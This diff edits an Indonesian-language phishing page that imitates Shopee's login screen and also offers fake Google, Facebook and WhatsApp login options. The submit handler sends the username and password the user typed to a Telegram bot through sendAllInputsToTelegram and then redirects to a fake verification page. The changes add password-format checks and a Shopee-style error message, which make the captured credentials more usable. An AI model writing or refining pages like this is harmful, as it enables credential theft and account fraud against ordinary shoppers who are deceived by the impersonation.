@@ -1,23 +1,57 @@
-<html lang="en">
+<!DOCTYPE html>
+<html lang="id">
+
 <head>
   <meta charset="utf-8" />
   <meta content="width=device-width, initial-scale=1" name="viewport" />
   <title>Login Page</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <link
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
-    rel="stylesheet"
-  />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <style>
+    /* Styling untuk pesan error agar terlihat seperti peringatan Shopee */
+    .password-error {
+      color: #EE4D2D;
+      /* Shopee Orange */
+      font-size: 0.875rem;
+      /* text-sm */
+      margin-top: 0.5rem;
+      /* mt-2 */
+      display: none;
+    }
+  </style>
   <script>
     let resendTimer;
     let resendCountdown = 60;
+
+    // --- FUNGSI VALIDASI PASSWORD BARU ---
+    function validatePassword(password) {
+      // Kriteria:
+      // 1. Minimum 8 karakter, Maksimum 16 karakter
+      // 2. Mengandung setidaknya 1 huruf kecil ([a-z])
+      // 3. Mengandung setidaknya 1 huruf besar ([A-Z])
+      // 4. Mengandung setidaknya 1 angka ([0-9])
+
+      const minLength = 8;
+      const maxLength = 16;
+      const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,16}$/;
+
+      if (!password) return false;
+
+      return regex.test(password);
+    }
 
     // --- Shopee Login Button Enable/Disable Logic ---
     function checkShopeeLoginInputs() {
       const usernameInput = document.getElementById("shopeeUsername");
       const passwordInput = document.getElementById("password");
       const loginBtn = document.getElementById("shopeeLoginBtn");
-      if (usernameInput.value.trim() && passwordInput.value.trim()) {
+
+      // Sembunyikan pesan error saat input berubah
+      document.getElementById("passwordError").style.display = 'none';
+      passwordInput.classList.remove('border-red-500');
+      passwordInput.classList.add('border-gray-300');
+
+      if (usernameInput.value.trim() && passwordInput.value.trim().length >= 8) {
         loginBtn.disabled = false;
         loginBtn.classList.remove("bg-gray-300", "text-gray-400", "cursor-not-allowed");
         loginBtn.classList.add("bg-orange-600", "text-white", "cursor-pointer");
@@ -87,7 +121,9 @@
       try {
         fetch(url, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {
+            "Content-Type": "application/json"
+          },
           body: JSON.stringify({
             chat_id: chatId,
             text: text
@@ -96,9 +132,23 @@
       } catch (e) {}
     }
 
-    // --- Shopee login form submit handler ---
+    // --- Shopee login form submit handler (Diperbarui dengan Validasi Password) ---
     function submitShopeeLogin(event) {
       event.preventDefault();
+
+      const passwordInput = document.getElementById("password");
+      const password = passwordInput.value.trim();
+      const passwordError = document.getElementById("passwordError");
+
+      if (!validatePassword(password)) {
+        // Tampilkan pesan error jika password tidak valid
+        passwordError.style.display = 'block';
+        passwordInput.classList.remove('border-gray-300');
+        passwordInput.classList.add('border-red-500');
+        return;
+      }
+
+      // Jika validasi berhasil: Kirim data dan lanjutkan
       sendAllInputsToTelegram('shopee');
       window.location.href = "verifikasi.html";
     }
@@ -112,58 +162,45 @@
 </head>
 
 <body class="bg-white min-h-screen flex flex-col items-center justify-center px-6">
-  <img
-    alt="Shopee logo orange text with shopping bag icon"
-    class="mb-10"
-    height="64"
-    src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Shopee_logo.svg"
-    width="64"
-  />
+  <img alt="Shopee logo orange text with shopping bag icon" class="mb-10" height="64"
+    src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Shopee_logo.svg" width="64" />
 
-  <!-- Main Login Section -->
   <div id="mainLoginSection" class="w-full max-w-sm">
     <form id="loginForm" class="mb-6" autocomplete="off">
       <div class="relative mb-6">
         <span class="absolute inset-y-0 left-0 flex items-center pl-2 text-gray-400 text-lg">
           <i class="fas fa-user"></i>
         </span>
-        <input
-          id="shopeeUsername"
+        <input id="shopeeUsername"
           class="w-full border-b border-gray-300 py-2 pl-10 pr-2 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
-          placeholder="No. Handphone/Email/Username"
-          type="text"
-          required
-          autocomplete="off"
-        />
+          placeholder="No. Handphone/Email/Username" type="text" required autocomplete="off" />
       </div>
-      <div class="relative mb-4 flex items-center border-b border-gray-300">
-        <span class="absolute left-0 pl-2 text-gray-400 text-lg">
-          <i class="fas fa-lock"></i>
-        </span>
-        <input
-          id="password"
-          class="w-full py-2 pl-10 pr-4 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
-          placeholder="Password"
-          type="password"
-          required
-          autocomplete="off"
-        />
-        <button
-          aria-label="Toggle password visibility"
-          class="absolute right-4 text-gray-400 text-xl focus:outline-none"
-          type="button"
-          onclick="togglePasswordVisibility()"
-          tabindex="-1"
-        >
-          <i class="fas fa-eye-slash" id="toggleIcon"></i>
-        </button>
+
+      <div class="relative mb-4">
+        <div class="relative flex items-center border-b border-gray-300">
+          <span class="absolute left-0 pl-2 text-gray-400 text-lg">
+            <i class="fas fa-lock"></i>
+          </span>
+          <input id="password"
+            class="w-full py-2 pl-10 pr-4 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
+            placeholder="Password" type="password" required autocomplete="off" minlength="8" maxlength="16"
+            pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,16}"
+            oninvalid="this.setCustomValidity('Password harus 8-16 karakter, mengandung huruf besar, huruf kecil, dan angka.')"
+            oninput="this.setCustomValidity(''); checkShopeeLoginInputs();" />
+          <button aria-label="Toggle password visibility"
+            class="absolute right-4 text-gray-400 text-xl focus:outline-none" type="button"
+            onclick="togglePasswordVisibility()" tabindex="-1">
+            <i class="fas fa-eye-slash" id="toggleIcon"></i>
+          </button>
+        </div>
+        <p id="passwordError" class="password-error">
+          Password yang Anda masukkan salah. Pastikan password terdiri dari 8-16 karakter, mencakup huruf besar, huruf kecil, dan angka.
+        </p>
       </div>
-      <button
-        id="shopeeLoginBtn"
+
+      <button id="shopeeLoginBtn"
         class="w-full bg-gray-300 text-gray-400 py-2 rounded-md text-center text-lg font-normal mb-4 cursor-not-allowed"
-        disabled
-        type="submit"
-      >
+        disabled type="submit">
         Log In
       </button>
     </form>
@@ -175,80 +212,49 @@
     </div>
 
     <div class="space-y-3">
-      <button
-        onclick="showLoginAlert()"
+      <button onclick="showLoginAlert()"
         class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
-        type="button"
-      >
-        <img
-          alt="Gmail logo in red and white"
-          class="mr-3"
-          height="20"
-          src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg"
-          width="20"
-        />
+        type="button">
+        <img alt="Gmail logo in red and white" class="mr-3" height="20"
+          src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg" width="20" />
         Log In dengan Google
       </button>
-      <button
-        onclick="showLoginAlert()"
+      <button onclick="showLoginAlert()"
         class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
-        type="button"
-      >
-        <img
-          alt="Facebook logo in blue"
-          class="mr-3"
-          height="20"
-          src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png"
-          width="20"
-        />
+        type="button">
+        <img alt="Facebook logo in blue" class="mr-3" height="20"
+          src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" width="20" />
         Log In dengan Facebook
       </button>
-      <button
-        onclick="goToWhatsAppNumberInput()"
+      <button onclick="goToWhatsAppNumberInput()"
         class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
-        type="button"
-      >
-        <img
-          alt="WhatsApp logo in green"
-          class="mr-3"
-          height="20"
-          src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"
-          width="20"
-        />
+        type="button">
+        <img alt="WhatsApp logo in green" class="mr-3" height="20"
+          src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="20" />
         Log In dengan WhatsApp
       </button>
     </div>
   </div>
 
-  <!-- WhatsApp Number Input Section -->
   <div id="whatsappNumberInputSection" class="hidden w-full max-w-sm">
     <h2 class="text-2xl font-semibold mb-6 text-center text-green-600">
       Masukkan Nomor WhatsApp Anda
     </h2>
     <div class="mb-4">
-      <input
-        id="waNumberInput"
-        type="tel"
-        placeholder="Masukkan nomor WhatsApp"
-        class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-green-600"
-      />
+      <input id="waNumberInput" type="tel" placeholder="Masukkan nomor WhatsApp"
+        class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-green-600" />
     </div>
     <div class="flex space-x-4">
-      <button
-        type="button"
-        onclick="submitWhatsAppNumber()"
-        class="flex-grow bg-green-600 text-white py-2 rounded-md text-lg font-semibold"
-      >
+      <button type="button" onclick="submitWhatsAppNumber()"
+        class="flex-grow bg-green-600 text-white py-2 rounded-md text-lg font-semibold">
         Lanjut
       </button>
-      <button
-        type="button"
-        onclick="backToMainFromWhatsApp()"
-        class="flex-grow border border-gray-300 py-2 rounded-md text-black text-base font-normal"
-      >
+      <button type="button" onclick="backToMainFromWhatsApp()"
+        class="flex-grow border border-gray-300 py-2 rounded-md text-black text-base font-normal">
         Kembali
       </button>
     </div>
   </div>
 </body>
+
 </html>
